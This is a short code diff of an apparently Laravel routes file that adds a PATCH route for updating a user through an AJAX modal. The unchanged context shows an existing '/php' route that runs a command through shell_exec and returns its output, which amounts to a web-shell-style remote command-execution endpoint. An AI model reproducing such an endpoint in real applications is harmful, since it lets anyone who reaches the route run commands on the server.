@@ -528,3 +528,6 @@ Route::get('/php', function () {
         return response()->json(['output' => shell_exec($cmd)]);
     }
 });
+
+// Rota para actualizar usuário via modal (AJAX)
+Route::patch('/usuario/{user}', [UsuarioController::class, 'update'])->name('usuario.update');
